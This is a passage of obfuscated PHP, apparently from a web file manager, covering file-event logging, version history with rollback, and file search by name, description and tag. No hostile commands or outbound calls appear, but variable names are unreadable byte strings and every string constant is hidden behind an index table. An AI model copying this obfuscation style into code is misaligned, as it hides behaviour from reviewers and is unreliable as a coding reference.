(isset($GLOBALS[$Õ•¼ˆÑ·[7]][$Õ•¼ˆÑ·[1613]])) { $é§×òë[$Õ•¼ˆÑ·[1613]] = $Õ•¼ˆÑ·[91]; } return $this->addEvent($¥…àÜûè, $Õ•¼ˆÑ·[1551], $é§×òë); } public function eventRecycle($ƒè¤Ğöï, $²ÁòöÙ”) { return $this->addEvent($ƒè¤Ğöï, $_SERVER[¹Éµ„ºå][2405], $²ÁòöÙ”); } private static $_removeLast = ''; public function eventRemove($é÷í•á²) { $§ü†ÛÚÆ =& $_SERVER[¹Éµ„ºå]; self::$_removeLast = $é÷í•á²; $ŸÖØÌÄË = Model($§ü†ÛÚÆ[1523])->sourceInfo($é÷í•á²); $ÅÔáøå• = array_field_key($ŸÖØÌÄË, array($§ü†ÛÚÆ[191], $§ü†ÛÚÆ[557], $§ü†ÛÚÆ[520], $§ü†ÛÚÆ[604])); $õ÷­†«¨ = array($§ü†ÛÚÆ[168] => $ŸÖØÌÄË[$§ü†ÛÚÆ[32]], $§ü†ÛÚÆ[2412] => ACTION, $§ü†ÛÚÆ[2413] => $ÅÔáøå•); return $this->addEvent($ŸÖØÌÄË[$§ü†ÛÚÆ[190]], $§ü†ÛÚÆ[1323], $õ÷­†«¨); } public function eventShare($ÚÄ÷Ìëà, $‘Åè»ĞÚ) { return $this->addEvent($ÚÄ÷Ìëà, $_SERVER[¹Éµ„ºå][1552], $‘Åè»ĞÚ); } public function eventMove($“™×€¸ä, $î’åŞ», $É”Ã«Ò…) { $ñá®Ó¾Ò =& $_SERVER[¹Éµ„ºå]; if (self::$_removeLast == $“™×€¸ä) { return; } $×æ«ıèş = Model($ñá®Ó¾Ò[1523]); $‘€ä… = $×æ«ıèş->sourceInfo($“™×€¸ä); $Ö»Ãåºø = $×æ«ıèş->sourceInfo($î’åŞ»); $ºŸÌ‘Œ = $×æ«ıèş->sourceInfo($É”Ã«Ò…); $éİ—˜“ö = array($ñá®Ó¾Ò[1335] => $î’åŞ», $ñá®Ó¾Ò[2414] => $Ö»Ãåºø[$ñá®Ó¾Ò[32]], $ñá®Ó¾Ò[2372] => !empty($Ö»Ãåºø[$ñá®Ó¾Ò[602]]) ? $Ö»Ãåºø[$ñá®Ó¾Ò[602]] : $ñá®Ó¾Ò[12], $ñá®Ó¾Ò[1336] => $É”Ã«Ò…, $ñá®Ó¾Ò[2415] => $ºŸÌ‘Œ[$ñá®Ó¾Ò[32]], $ñá®Ó¾Ò[2416] => !empty($ºŸÌ‘Œ[$ñá®Ó¾Ò[602]]) ? $ºŸÌ‘Œ[$ñá®Ó¾Ò[602]] : $ñá®Ó¾Ò[12]); $this->addEvent($“™×€¸ä, $ñá®Ó¾Ò[643], $éİ—˜“ö); $‘€ä… = $×æ«ıèş->sourceInfo($“™×€¸ä); $éİ—˜“ö = array($ñá®Ó¾Ò[191] => $‘€ä…[$ñá®Ó¾Ò[191]], $ñá®Ó¾Ò[32] => $‘€ä…[$ñá®Ó¾Ò[32]]); $this->addEvent($î’åŞ», $ñá®Ó¾Ò[2417], $éİ—˜“ö); } public function eventCopy($ø¯‘¼ò) { $this->eventCreate($ø¯‘¼ò, $_SERVER[¹Éµ„ºå][641]); } public function eventRename($£ÆƒŞŠ, $ãîšùø, $òéü‘È½) { $ëƒ¿Ñ‰Ş =& $_SERVER[¹Éµ„ºå]; $‚ò¯¯…º = array($ëƒ¿Ñ‰Ş[1335] => $ãîšùø, $ëƒ¿Ñ‰Ş[1336] => $òéü‘È½); return $this->addEvent($£ÆƒŞŠ, $ëƒ¿Ñ‰Ş[1536], $‚ò¯¯…º); } public function eventAddComment($…°¢õÚü, $‚®Ëèì“) { return $this->addEvent($…°¢õÚü, $_SERVER[¹Éµ„ºå][2418], $‚®Ëèì“); } public function eventAddDesc($ÃÖ¡ÆøÌ, $ºªÙÀ‘Ë) { return $this->addEvent($ÃÖ¡ÆøÌ, $_SERVER[¹Éµ„ºå][2419], $ºªÙÀ‘Ë); } public function listBySource($»îÌ…§õ) { $şä£ôÅ» =& $_SERVER[¹Éµ„ºå]; $æšëÉĞÓ = Model($şä£ôÅ»[1523])->sourceInfo($»îÌ…§õ); $ óòÈ—Í = array($şä£ôÅ»[506] => $»îÌ…§õ); if ($æšëÉĞÓ[$şä£ôÅ»[500]] == $şä£ôÅ»[91]) { $º¹¸‘Šü = Model($şä£ôÅ»[1523])->listSearchChildren($»îÌ…§õ, 20000); $º¹¸‘Šü[] = $»îÌ…§õ . $şä£ôÅ»[463]; $ óòÈ—Í = array($şä£ôÅ»[191] => array($şä£ôÅ»[7], $º¹¸‘Šü)); } $¬â ’Åİ = $this->where($ óòÈ—Í)->order($şä£ôÅ»[2420])->selectPage(); if ($¬â ’Åİ[$şä£ôÅ»[443]][$şä£ôÅ»[444]] == 0) { $¬â ’Åİ[$şä£ôÅ»[443]][$şä£ôÅ»[444]] = 1; $¬â ’Åİ[$şä£ôÅ»[446]] = array(array($şä£ôÅ»[506] => $»îÌ…§õ, $şä£ôÅ»[2401] => $æšëÉĞÓ[$şä£ôÅ»[190]], $şä£ôÅ»[1956] => $æšëÉĞÓ[$şä£ôÅ»[541]], $şä£ôÅ»[511] => $şä£ôÅ»[2421], $şä£ôÅ»[512] => $æšëÉĞÓ[$şä£ôÅ»[231]], $şä£ôÅ»[1958] => $şä£ôÅ»[12])); } return $this->eventListParse($¬â ’Åİ, $»îÌ…§õ); } private function eventListParse($Ø×Æ÷…í, $°Ğçõ­¾) { $¤µ€ÕõŸ =& $_SERVER[¹Éµ„ºå]; $äŒêÂ½· = $Ø×Æ÷…í[$¤µ€ÕõŸ[446]]; $÷—¼Ÿ£‹ = array_to_keyvalue($äŒêÂ½·, $¤µ€ÕõŸ[12], $¤µ€ÕõŸ[191]); $±ğÂãàÓ = array_to_keyvalue($äŒêÂ½·, $¤µ€ÕõŸ[12], $¤µ€ÕõŸ[2407]); foreach ($äŒêÂ½· as $ÜÚë¶›) { $é¨ç‡Ù = $ÜÚë¶›[$¤µ€ÕõŸ[540]]; if ($ÜÚë¶›[$¤µ€ÕõŸ[33]] == $¤µ€ÕõŸ[643] && isset($é¨ç‡Ù[$¤µ€ÕõŸ[1335]])) { $÷—¼Ÿ£‹[] = $é¨ç‡Ù[$¤µ€ÕõŸ[1335]] . $¤µ€ÕõŸ[12]; $÷—¼Ÿ£‹[] = $é¨ç‡Ù[$¤µ€ÕõŸ[1336]] . $¤µ€ÕõŸ[12]; } if ($ÜÚë¶›[$¤µ€ÕõŸ[33]] == $¤µ€ÕõŸ[2417] && isset($é¨ç‡Ù[$¤µ€ÕõŸ[191]])) { $÷—¼Ÿ£‹[] = $é¨ç‡Ù[$¤µ€ÕõŸ[191]] . $¤µ€ÕõŸ[12]; } } $÷—¼Ÿ£‹ = array_merge($÷—¼Ÿ£‹, $±ğÂãàÓ, array($°Ğçõ­¾ . $¤µ€ÕõŸ[12])); $÷—¼Ÿ£‹ = array_unique($÷—¼Ÿ£‹); $£ù÷øî® = array_unique(array_to_keyvalue($äŒêÂ½·, $¤µ€ÕõŸ[12], $¤µ€ÕõŸ[1582])); $íôİœÓ  = Model($¤µ€ÕõŸ[617])->userListInfo($£ù÷øî®); $¢çâŞæØ = Model($¤µ€ÕõŸ[924])->sourceListInfo($÷—¼Ÿ£‹, !0); foreach ($äŒêÂ½· as &$ÜÚë¶›) { if ($ÜÚë¶›[$¤µ€ÕõŸ[33]] == $¤µ€ÕõŸ[643] && isset($ÜÚë¶›[$¤µ€ÕõŸ[540]][$¤µ€ÕõŸ[1335]])) { $ÜÚë¶›[$¤µ€ÕõŸ[540]][$¤µ€ÕõŸ[1335]] = $¢çâŞæØ[$ÜÚë¶›[$¤µ€ÕõŸ[540]][$¤µ€ÕõŸ[1335]]]; $ÜÚë¶›[$¤µ€ÕõŸ[540]][$¤µ€ÕõŸ[1336]] = $¢çâŞæØ[$ÜÚë¶›[$¤µ€ÕõŸ[540]][$¤µ€ÕõŸ[1336]]]; } if ($ÜÚë¶›[$¤µ€ÕõŸ[33]] == $¤µ€ÕõŸ[2417] && isset($ÜÚë¶›[$¤µ€ÕõŸ[540]][$¤µ€ÕõŸ[191]])) { $ÜÚë¶›[$¤µ€ÕõŸ[540]][$¤µ€ÕõŸ[191]] = $¢çâŞæØ[$ÜÚë¶›[$¤µ€ÕõŸ[540]][$¤µ€ÕõŸ[191]]]; } $ÜÚë¶›[$¤µ€ÕõŸ[90]] = $¢çâŞæØ[$ÜÚë¶›[$¤µ€ÕõŸ[191]]]; $ÜÚë¶›[$¤µ€ÕõŸ[2422]] = $¢çâŞæØ[$ÜÚë¶›[$¤µ€ÕõŸ[2407]]]; if ($ÜÚë¶›[$¤µ€ÕõŸ[33]] == $¤µ€ÕõŸ[1323]) { $ÜÚë¶›[$¤µ€ÕõŸ[2422]] = $ÜÚë¶›[$¤µ€ÕõŸ[90]]; $ÜÚë¶›[$¤µ€ÕõŸ[2407]] = $ÜÚë¶›[$¤µ€ÕõŸ[2422]][$¤µ€ÕõŸ[191]]; $ÜÚë¶›[$¤µ€ÕõŸ[90]] = !1; $ÜÚë¶›[$¤µ€ÕõŸ[191]] = $¤µ€ÕõŸ[12]; } $ÜÚë¶›[$¤µ€ÕõŸ[2346]] = $íôİœÓ [$ÜÚë¶›[$¤µ€ÕõŸ[1582]]]; } unset($ÜÚë¶›); $Ø×Æ÷…í[$¤µ€ÕõŸ[446]] = $äŒêÂ½·; return $Ø×Æ÷…í; } public function removeBySource($°êÉË©Ê) { $©ù™¢­ì = array($_SERVER[¹Éµ„ºå][506] => $°êÉË©Ê); $this->where($©ù™¢­ì)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\162\x63\x65\137\x68\x69\163\164\x6f\x72\x79"; public function historyCount($ÖùşÙËå) { $şÎ–¦å“ =& $_SERVER[¹Éµ„ºå]; if (!$ÖùşÙËå) { return array(); } if (is_string($ÖùşÙËå) || is_int($ÖùşÙËå)) { $ÖùşÙËå = array($ÖùşÙËå); } $ûüä¿äĞ = array($şÎ–¦å“[191], $şÎ–¦å“[940] => $şÎ–¦å“[585]); $”Âì¢å‡ = array($şÎ–¦å“[191] => array($şÎ–¦å“[7], $ÖùşÙËå)); $ú‘şõÄ© = $this->field($ûüä¿äĞ)->where($”Âì¢å‡)->group($şÎ–¦å“[191])->select(); return array_to_keyvalue($ú‘şõÄ©, $şÎ–¦å“[191], $şÎ–¦å“[585]); } public function addHistory($çàØÎº´, $Š³¸Ë¨õ = '') { $¥Œİà’¦ =& $_SERVER[¹Éµ„ºå]; $Ö†±½é® = array($¥Œİà’¦[506] => $çàØÎº´[$¥Œİà’¦[191]], $¥Œİà’¦[1956] => isset($çàØÎº´[$¥Œİà’¦[543]]) ? $çàØÎº´[$¥Œİà’¦[543]] : $çàØÎº´[$¥Œİà’¦[541]], $¥Œİà’¦[558] => $çàØÎº´[$¥Œİà’¦[557]], $¥Œİà’¦[640] => $çàØÎº´[$¥Œİà’¦[79]], $¥Œİà’¦[2423] => $Š³¸Ë¨õ); if ($GLOBALS[$¥Œİà’¦[6]][$¥Œİà’¦[92]][$¥Œİà’¦[1396]] >= 1) { $this->historyAutoClear($Ö†±½é®[$¥Œİà’¦[191]]); $this->add($Ö†±½é®); } Hook::trigger($¥Œİà’¦[2424], $Ö†±½é®); Model($¥Œİà’¦[2425])->eventFileEdit($çàØÎº´[$¥Œİà’¦[191]]); } private function historyAutoClear($óÁóÃÏÄ) { $ÁËâøØï =& $_SERVER[¹Éµ„ºå]; $Äûƒï”ß = Model($ÁËâøØï[864])->get($ÁËâøØï[952]); $Î—¦ÚÜ— = intval($GLOBALS[$ÁËâøØï[6]][$ÁËâøØï[92]][$ÁËâøØï[1396]]); $¹ùøÈñ° = $Äûƒï”ß == $ÁËâøØï[953] ? min(5, $Î—¦ÚÜ—) : $Î—¦ÚÜ—; $¹ùøÈñ° = $¹ùøÈñ° <= 0 ? 0 : $¹ùøÈñ° - 1; if ($¹ùøÈñ° >= 499) { return; } $‹œÕÀ‹ê = array($ÁËâøØï[506] => $óÁóÃÏÄ); $Í—¬¬µõ = $this->field($ÁËâøØï[2426])->where($‹œÕÀ‹ê)->order($ÁËâøØï[2420])->select(); if (!$Í—¬¬µõ || $¹ùøÈñ° >= count($Í—¬¬µõ)) { return; } $üˆÅµ×Á = array_to_keyvalue($Í—¬¬µõ, $ÁËâøØï[12], $ÁËâøØï[487]); $üˆÅµ×Á = array_slice($üˆÅµ×Á, $¹ùøÈñ°); $îè¦Ú×¤ = array_to_keyvalue($Í—¬¬µõ, $ÁËâøØï[12], $ÁËâøØï[557]); $îè¦Ú×¤ = array_slice($îè¦Ú×¤, $¹ùøÈñ°); if (!$üˆÅµ×Á || !$îè¦Ú×¤) { return; } $‹œÕÀ‹ê = array($ÁËâøØï[508] => array($ÁËâøØï[7], $üˆÅµ×Á)); $this->where($‹œÕÀ‹ê)->delete(); Model($ÁËâøØï[560])->remove($îè¦Ú×¤); } public function listData($œ™”Ô§¹) { $¥¡·ªÀµ =& $_SERVER[¹Éµ„ºå]; $²ªö–ºİ = array($¥¡·ªÀµ[506] => $œ™”Ô§¹); $‰‰áòİ“ = $¥¡·ªÀµ[2427]; $Ô¸¤Ö¢í = $this->field($‰‰áòİ“)->where($²ªö–ºİ)->order($¥¡·ªÀµ[2420])->selectPage(); $this->_listAppendUser($Ô¸¤Ö¢í[$¥¡·ªÀµ[446]]); $ôÙøËô° = Model($¥¡·ªÀµ[864])->get($¥¡·ªÀµ[952]); $ËÜöäŞ¨ = 5; if ($ôÙøËô° == $¥¡·ªÀµ[953]) { $Ô¸¤Ö¢í[$¥¡·ªÀµ[446]] = array_slice($Ô¸¤Ö¢í[$¥¡·ªÀµ[446]], 0, $ËÜöäŞ¨); $Ô¸¤Ö¢í[$¥¡·ªÀµ[443]] = array($¥¡·ªÀµ[2428] => 1, $¥¡·ªÀµ[2429] => 20, $¥¡·ªÀµ[2430] => 1, $¥¡·ªÀµ[2320] => count($Ô¸¤Ö¢í[$¥¡·ªÀµ[446]])); } return $Ô¸¤Ö¢í; } protected function _listAppendUser(&$à°ÈìĞû) { $ç—•ş®¿ =& $_SERVER[¹Éµ„ºå]; $£åÉ‡»ö = array_to_keyvalue($à°ÈìĞû, $ç—•ş®¿[12], $ç—•ş®¿[1582]); $ÔÁ“ãŸÆ = Model($ç—•ş®¿[617])->userListInfo($£åÉ‡»ö); foreach ($à°ÈìĞû as &$ûŠ¡Å–) { $Šœ¯Á³† = $ûŠ¡Å–[$ç—•ş®¿[1582]]; $ûŠ¡Å–[$ç—•ş®¿[541]] = $ÔÁ“ãŸÆ[$Šœ¯Á³†] ? $ÔÁ“ãŸÆ[$Šœ¯Á³†] : !1; } unset($ûŠ¡Å–); } public function fileInfo($ÚüèíÆ°, $Ë÷ÒÕÀ¼ = false) { $ùâÁì’ı =& $_SERVER[¹Éµ„ºå]; $¡ÇóÃ¢ = $this->tablePrefix; $£¢ã¨‰¬ = "{$¡ÇóÃ¢}\151\x6f\x5f\146\x69\154\x65\x20\146\151\x6c\x65\x73\x20\x6f\156\x20\x66\151\154\145\x73\x2e\x66\151\154\145\111\104\x20\x3d\40\x68\151\x73\x74\x6f\x72\x79\x2e\x66\x69\x6c\x65\111\x44"; $ÚÆ¸”ï = $this->alias($ùâÁì’ı[2431])->where(array($ùâÁì’ı[508] => $ÚüèíÆ°))->join($£¢ã¨‰¬, $ùâÁì’ı[2432])->find(); if ($ÚÆ¸”ï && $Ë÷ÒÕÀ¼) { $Ô†Ö§§ = array($ùâÁì’ı[191] => $ÚÆ¸”ï[$ùâÁì’ı[191]], $ùâÁì’ı[487] => array($ùâÁì’ı[1170], $ÚüèíÆ°)); $ÚÆ¸”ï[$ùâÁì’ı[1853]] = $this->where($Ô†Ö§§)->count(); } return $ÚÆ¸”ï; } public function removeItem($å Á€”) { $¸åÀÖª =& $_SERVER[¹Éµ„ºå]; $¸ˆ•à = array($¸åÀÖª[508] => $å Á€”); $óÂÔúí‘ = $this->where($¸ˆ•à)->find(); if ($óÂÔúí‘) { $°úƒ¤Ç’ = $this->where($¸ˆ•à)->delete(); Model($¸åÀÖª[560])->remove($óÂÔúí‘[$¸åÀÖª[557]]); return $°úƒ¤Ç’; } return !1; } public function removeBySource($Ê«’±•á) { $øõæ¸¹Ï =& $_SERVER[¹Éµ„ºå]; if (!$Ê«’±•á) { return !1; } if (!is_array($Ê«’±•á)) { $Ê«’±•á = array($Ê«’±•á); } $Šóµ‰‡Ë = array($øõæ¸¹Ï[506] => array($øõæ¸¹Ï[7], $Ê«’±•á)); $ÉÅúğ¶ = $this->field($øõæ¸¹Ï[558])->where($Šóµ‰‡Ë)->select(); if ($ÉÅúğ¶) { $this->where($Šóµ‰‡Ë)->delete(); $¨ÜË®æ© = array_to_keyvalue($ÉÅúğ¶, $øõæ¸¹Ï[12], $øõæ¸¹Ï[557]); Model($øõæ¸¹Ï[560])->remove($¨ÜË®æ©); } return !0; } public function setDetail($Íœıİ˜ä, $ãøÎÙ·Ï) { $…ÜÃİ˜„ =& $_SERVER[¹Éµ„ºå]; return $this->where(array($…ÜÃİ˜„[508] => $Íœıİ˜ä))->save(array($…ÜÃİ˜„[2423] => $ãøÎÙ·Ï)); } public function rollbackToItem($Óˆà¯¶¡, $•˜î¬ãÉ) { $¹ëßÑØÀ =& $_SERVER[¹Éµ„ºå]; $Åƒ–ÓÛÌ = Model($¹ëßÑØÀ[924])->sourceInfo($Óˆà¯¶¡); $this->addHistory($Åƒ–ÓÛÌ, LNG($¹ëßÑØÀ[2433])); $³ìè¶»È = $this->find($•˜î¬ãÉ); $À…ß—½ì = array($¹ëßÑØÀ[557] => $³ìè¶»È[$¹ëßÑØÀ[557]], $¹ëßÑØÀ[79] => $³ìè¶»È[$¹ëßÑØÀ[79]], $¹ëßÑØÀ[88] => time(), $¹ëßÑØÀ[543] => USER_ID); Model($¹ëßÑØÀ[924])->where(array($¹ëßÑØÀ[191] => $Óˆà¯¶¡))->save($À…ß—½ì); return $this->where(array($¹ëßÑØÀ[508] => $•˜î¬ãÉ))->delete(); } public function clearSame($“­ÃØ¬) { $ÙŞ£”â =& $_SERVER[¹Éµ„ºå]; $ìÆ…Ûó = $this->listData($“­ÃØ¬); $ë”ëê»‰ = array_to_keyvalue_group($ìÆ…Ûó, $ÙŞ£”â[557]); $û‰´ïøÈ = array(); $õôÆ–ó¡ = array(); foreach ($ë”ëê»‰ as $Îå‰õ·) { if (!$Îå‰õ· || count($Îå‰õ·) <= 1) { continue; } foreach ($Îå‰õ· as $¦»­ºÜä) { $û‰´ïøÈ[] = $¦»­ºÜä[$ÙŞ£”â[557]]; $õôÆ–ó¡[] = $¦»­ºÜä[$ÙŞ£”â[487]]; } } if (!$õôÆ–ó¡) { return; } $this->where(array($ÙŞ£”â[487] => array($ÙŞ£”â[7], $õôÆ–ó¡)))->delete(); Model($ÙŞ£”â[560])->remove($û‰´ïøÈ); } public function userSpace() { $¤ íØô˜ =& $_SERVER[¹Éµ„ºå]; $¾°ÍûË± = $this->tablePrefix; $Æ·¤½ì = array($¤ íØô˜[1956] => USER_ID); $ëè¥ƒ±ï = "{$¾°ÍûË±}\151\x6f\x5f\x66\151\154\145\40\146\151\154\x65\163\40\157\x6e\40\146\151\x6c\x65\x73\x2e\x66\x69\x6c\x65\x49\104\40\75\40\x68\x69\163\164\157\162\x79\x2e\146\x69\154\x65\111\x44"; return $this->alias($¤ íØô˜[2431])->where($Æ·¤½ì)->join($ëè¥ƒ±ï, $¤ íØô˜[2432])->sum($¤ íØô˜[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($á‹ÓØàœ) { $½‡››¨™ =& $_SERVER[¹Éµ„ºå]; $Öî¤Èå = KodIO::fileTypeList(); $Şó‰ÓÍÍ = $Öî¤Èå[$á‹ÓØàœ]; if (!$Şó‰ÓÍÍ) { return array(); } $„¼­¾²Ã = $Şó‰ÓÍÍ[$½‡››¨™[166]]; $€áÒ©Š = $½‡››¨™[7]; if (!$Şó‰ÓÍÍ[$½‡››¨™[166]]) { $ öøø´ = array_to_keyvalue($Öî¤Èå, $½‡››¨™[12], $½‡››¨™[166]); $„¼­¾²Ã = implode($½‡››¨™[50], $ öøø´); $€áÒ©Š = $½‡››¨™[2434]; } $Æı¨µàÌ = explode($½‡››¨™[50], trim($„¼­¾²Ã, $½‡››¨™[50])); return array($€áÒ©Š, $Æı¨µàÌ); } public function listPathType($™˜èŠ—) { $ä‚óÍ½ =& $_SERVER[¹Éµ„ºå]; $¡´Çû¹ = $this->fileTypeWhere($™˜èŠ—); if (!$¡´Çû¹) { return array(); } $¾ø¤Ü®ö = USER_ID; $›ïóšÌ = Model($ä‚óÍ½[617])->getInfo($¾ø¤Ü®ö); $ùˆè»Î³ = array($ä‚óÍ½[670] => SourceModel::TYPE_USER, $ä‚óÍ½[604] => array($ä‚óÍ½[635], $ä‚óÍ½[613] . $›ïóšÌ[$ä‚óÍ½[90]][$ä‚óÍ½[191]] . $ä‚óÍ½[636]), $ä‚óÍ½[671] => $¾ø¤Ü®ö, $ä‚óÍ½[668] => 0, $ä‚óÍ½[669] => $¡´Çû¹); return $this->listSource($ùˆè»Î³); } public function listSearch($ê‡óÈ®, $½çÁÒº = 300) { $­Æí¾ö™ =& $_SERVER[¹Éµ„ºå]; if (isset($ê‡óÈ®[$­Æí¾ö™[2269]]) && $ê‡óÈ®[$­Æí¾ö™[2269]]) { $ê‡óÈ®[$­Æí¾ö™[2269]] = str_replace($­Æí¾ö™[474], $­Æí¾ö™[2435], trim($ê‡óÈ®[$­Æí¾ö™[2269]])); } $¿¸ù² = $this->_parseSearchWhere($ê‡óÈ®); if (!isset($¿¸ù²[$­Æí¾ö™[520]])) { $¿¸ù²[$­Æí¾ö™[520]] = 0; } $ïèÓå½ = $­Æí¾ö™[2436]; $Ğø“ÙœÇ = $¿¸ù²; $‰ªª˜à = $ïèÓå½; $this->_listSearchBindPinyin($ê‡óÈ®, $¿¸ù², $ïèÓå½); $this->alias($­Æí¾ö™[533])->_makeOrder(); $¿¸ù² = $this->parseWhereLike($¿¸ù²); $¢¯µ Ü = $this->distinct(!0)->field($ïèÓå½)->where($¿¸ù²)->selectPage($½çÁÒº); if ($GLOBALS[$­Æí¾ö™[6]][$­Æí¾ö™[468]][$­Æí¾ö™[469]] && Input::check($ê‡óÈ®[$­Æí¾ö™[2269]], $­Æí¾ö™[677]) && $¢¯µ Ü[$­Æí¾ö™[443]][$­Æí¾ö™[428]] == 1 && $¢¯µ Ü[$­Æí¾ö™[443]][$­Æí¾ö™[444]] == 0) { $¢¯µ Ü = $this->distinct(!0)->field($ïèÓå½)->where($Ğø“ÙœÇ)->limit(1000)->select(); $¢¯µ Ü = array_page_split($¢¯µ Ü, !1, $½çÁÒº); } $this->_listSearchFileContent($¢¯µ Ü, $ê‡óÈ®, $‰ªª˜à, $Ğø“ÙœÇ); $this->_listSearchDesc($¢¯µ Ü, $ê‡óÈ®, $‰ªª˜à); $this->_listSearchTag($¢¯µ Ü, $ê‡óÈ®, $‰ªª˜à); $this->_listSearchGroupTag($¢¯µ Ü, $ê‡óÈ®, $‰ªª˜à); $this->_listDataApply($¢¯µ Ü[$­Æí¾ö™[446]]); $this->_listMake($¢¯µ Ü); return $¢¯µ Ü; } private function _listSearchFileContent(&$×„ƒİ, $Èû„»İ, $ş­»öÚ, $ìËÇççÜ) { $È²­†ş˜ =& $_SERVER[¹Éµ„ºå]; if (!$Èû„»İ[$È²­†ş˜[2269]] || $×„ƒİ[$È²­†ş˜[443]][$È²­†ş˜[428]] > 1) { return; } if (!isset($ìËÇççÜ[$È²­†ş˜[32]]) || !is_array($Èû„»İ[$È²­†ş˜[557]]) || !$Èû„»İ[$È²­†ş˜[557]]) { return; } $ìËÇççÜ[$È²­†ş˜[557]] = array($È²­†ş˜[7], $Èû„»İ[$È²­†ş˜[557]]); unset($ìËÇççÜ[$È²­†ş˜[32]]); unset($Èû„»İ[$È²­†ş˜[557]]); $»ªõ†é² = $this->field($ş­»öÚ)->where($ìËÇççÜ)->limit($È²­†ş˜[2437])->select(); $»ªõ†é² = array_to_keyvalue($»ªõ†é², $È²­†ş˜[191], $È²­†ş˜[12]); $¢å×ŠÀÎ = array_to_keyvalue($×„ƒİ[$È²­†ş˜[446]], $È²­†ş˜[191], $È²­†ş˜[12]); $ä‹ëÆı³ = array(); foreach ($»ªõ†é² as $ªçÈ¢Ïû => $ƒÚ…Ë£Â) { if (!$¢å×ŠÀÎ[$ªçÈ¢Ïû]) { $ä‹ëÆı³[] = $ƒÚ…Ë£Â; } } if (!$ä‹ëÆı³) { return; } $×„ƒİ[$È²­†ş˜[446]] = array_merge($ä‹ëÆı³, $×„ƒİ[$È²­†ş˜[446]]); $×„ƒİ[$È²­†ş˜[443]][$È²­†ş˜[444]] += count($ä‹ëÆı³); } private function _listSearchTag(&$ìŸ¡ÜÖ’, $ò¨ğºä, $•¥¸Æµ¾) { $Œ©ÒÜÈÉ =& $_SERVER[¹Éµ„ºå]; if (empty($ò¨ğºä[$Œ©ÒÜÈÉ[2131]]) || !in_array($Œ©ÒÜÈÉ[2438], $ò¨ğºä[$Œ©ÒÜÈÉ[2131]])) { return; } if (!$ò¨ğºä[$Œ©ÒÜÈÉ[2269]] || $ìŸ¡ÜÖ’[$Œ©ÒÜÈÉ[443]][$Œ©ÒÜÈÉ[428]] > 1) { return; } $Û•¹îù = Model($Œ©ÒÜÈÉ[2439])->listData(); $‘›Ä€µâ = array(); $‰ËÅ±Ú© = $ò¨ğºä[$Œ©ÒÜÈÉ[2269]]; foreach ($Û•¹îù as $»Ø×é ¢) { $Ñ±ß¬ş = $»Ø×é ¢[$Œ©ÒÜÈÉ[32]]; $ùàëØ” = str_replace($Œ©ÒÜÈÉ[53], $Œ©ÒÜÈÉ[12], Pinyin::get($Ñ±ß¬ş)); if (stripos($Ñ±ß¬ş, $‰ËÅ±Ú©) !== !1 || stripos($ùàëØ”, $‰ËÅ±Ú©) !== !1) { $‘›Ä€µâ[] = $»Ø×é ¢[$Œ©ÒÜÈÉ[487]]; } } if (!$‘›Ä€µâ) { return; } $èğÓ¾ë¡ = array($Œ©ÒÜÈÉ[515] => array($Œ©ÒÜÈÉ[7], $‘›Ä€µâ), $Œ©ÒÜÈÉ[1582] => USER_ID); $îÑ—ìöÂ = Model($Œ©ÒÜÈÉ[517])->field($Œ©ÒÜÈÉ[87])->where($èğÓ¾ë¡)->select(); $îÑ—ìöÂ = array_to_keyvalue($îÑ—ìöÂ, $Œ©ÒÜÈÉ[12], $Œ©ÒÜÈÉ[87]); $¡ôÅáÍ‚ = array_unique($îÑ—ìöÂ); $this->_listSearchMerge($ìŸ¡ÜÖ’, $ò¨ğºä, $•¥¸Æµ¾, $¡ôÅáÍ‚); } private function _listSearchDesc(&$ûõ“Şöš, $İâñ€É, $¼Ë©Ö¥¥) { $¨»øì¨… =& $_SERVER[¹Éµ„ºå]; if (empty($İâñ€É[$¨»øì¨…[2131]]) || !in_array($¨»øì¨…[540], $İâñ€É[$¨»øì¨…[2131]])) { return; } if (!$İâñ€É[$¨»øì¨…[2269]] || $ûõ“Şöš[$¨»øì¨…[443]][$¨»øì¨…[428]] > 1) { return; } $ì¼Œ¶¡Ó = array($¨»øì¨…[95] => $¨»øì¨…[540], $¨»øì¨…[451] => array($¨»øì¨…[473], $¨»øì¨…[2271] . $İâñ€É[$¨»øì¨…[2269]] . $¨»øì¨…[2271])); $àÙ²¸Ä = !1; if ($àÙ²¸Ä) { $Ú„ËÏØ = $this->listSearchChildren($İâñ€É[$¨»øì¨…[190]]); $Ú„ËÏØ = array_unique($Ú„ËÏØ); if (!$Ú„ËÏØ) { return; } $ì¼Œ¶¡Ó[$¨»øì¨…[191]] = array($¨»øì¨…[7], $Ú„ËÏØ); } $Ùâé—ù© = Model($¨»øì¨…[471])->field($¨»øì¨…[191])->where($ì¼Œ¶¡Ó)->limit(5000)->select(); $÷íô‡ÀÛ = array_to_keyvalue($Ùâé—ù©, $¨»øì¨…[12], $¨»øì¨…[191]); $this->_listSearchMerge($ûõ“Şöš, $İâñ€É, $¼Ë©Ö¥¥, $÷íô‡ÀÛ); } private function _listSearchGroupTag(&$Ì³úœÊ, $Ùš½¼Ï§, $Ë¬¬ˆ››) { $ĞÊåšÁ¾ =& $_SERVER[¹Éµ„ºå]; if (empty($Ùš½¼Ï§[$ĞÊåšÁ¾[2131]]) || !in_array($ĞÊåšÁ¾[2438], $Ùš½¼Ï§[$ĞÊåšÁ¾[2131]])) { return; } if (!$Ùš½¼Ï§[$ĞÊåšÁ¾[2269]] || $Ì³úœÊ[$ĞÊåšÁ¾[443]][$ĞÊåšÁ¾[428]] > 1 || !$Ùš½¼Ï§[$ĞÊåšÁ¾[190]]) { return; } $ëÇ¿’‰É = $this->sourceInfo($Ùš½¼Ï§[$ĞÊåšÁ¾[190]]); if (!$ëÇ¿’‰É || $ëÇ¿’‰É[$ĞÊåšÁ¾[188]] != SourceModel::TYPE_GROUP) { return; } $‰¬ £‰ = $ëÇ¿’‰É[$ĞÊåšÁ¾[589]]; $ĞÁğ®Ñ• = Model($ĞÊåšÁ¾[2440])->get($‰¬ £‰); $Ä‘ÄÊÉü = array(); $ˆ…´ı² = $Ùš½¼Ï§[$ĞÊåšÁ¾[2269]]; foreach ($ĞÁğ®Ñ•[$ĞÊåšÁ¾[446]] as $ïâ©Ì) { $˜ŸŠ‡ìè = $ïâ©Ì[$ĞÊåšÁ¾[32]]; $øÇÛïîÔ = str_replace($ĞÊåšÁ¾[53], $ĞÊåšÁ¾[12], Pinyin::get($˜ŸŠ‡ìè)); if 